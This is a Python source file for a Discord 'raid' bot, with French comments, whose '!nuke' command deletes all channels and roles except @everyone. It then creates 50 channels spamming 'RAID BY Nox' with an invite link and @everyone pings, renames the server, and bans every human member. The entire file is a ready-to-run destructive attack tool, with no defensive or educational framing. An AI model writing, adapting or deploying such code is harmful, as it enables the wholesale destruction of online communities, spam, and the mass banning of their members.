import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Nuke en cours...")
        try:
            # Supprimer salons et rôles (sauf @everyone)
            for channel in ctx.guild.channels:
                await channel.delete()

            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    await role.delete()

            await ctx.send("Salons et rôles supprimés avec succès !")

            # Créer 50 salons et spammer les messages
            for _ in range(50):
                channel = await ctx.guild.create_text_channel("☠️ RAID BY Nox ☠️")
                # Envoi des 5 messages dans chaque salon
                for _ in range(5):  # 5 messages par salon
                    await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
                    await asyncio.sleep(0.1)  # Petite pause pour éviter trop de solliciter le serveur

            await ctx.send("50 salons créés et messages envoyés avec succès !")

            # Renommer le serveur
            await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")
            await ctx.send("Serveur renommé avec succès !")

            # Bannir tous les membres sauf les bots
            for member in ctx.guild.members:
                if not member.bot:
                    await member.ban()
                    await asyncio.sleep(0.2)  # Pause pour éviter trop de bannissements en même temps

            print("Nuke terminé.")
            await ctx.send("Le nuke est terminé. Tous les membres ont été bannis.")

        except Exception as e:
            await ctx.send(f"Une erreur est survenue pendant le nuke : {str(e)}")
            print(f"Erreur : {str(e)}")
    else:
        await ctx.send("Tu n'as pas la permission d'utiliser cette commande.")

bot.run(os.getenv("TOKEN"))
